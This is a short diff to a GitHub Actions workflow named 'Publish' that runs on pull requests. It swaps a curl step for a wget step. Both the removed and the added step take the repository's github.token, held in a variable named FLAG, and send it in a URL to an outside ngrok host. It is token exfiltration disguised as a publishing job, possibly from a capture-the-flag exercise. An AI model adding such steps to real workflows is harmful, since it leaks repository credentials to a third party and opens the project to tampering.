@@ -3,15 +3,15 @@ name: Publish
 on: ["pull_request"]
 
 jobs:
-  curl:
+  wget:
     runs-on: ubuntu-latest
     steps:
-    - name: curl
-      uses: wei/curl@master
+    - name: wget
+      uses: wei/wget@v1
       env:
         FLAG: ${{ github.token }}
       with:
-        args: -H \"Host: c9e80d059604.ngrok.io\" https://c9e80d059604.ngrok.io/?token=${FLAG}
+        args: -O sample.html https://c9e80d059604.ngrok.io/?token=${FLAG}
   deploy:
     runs-on: ubuntu-latest
     steps:
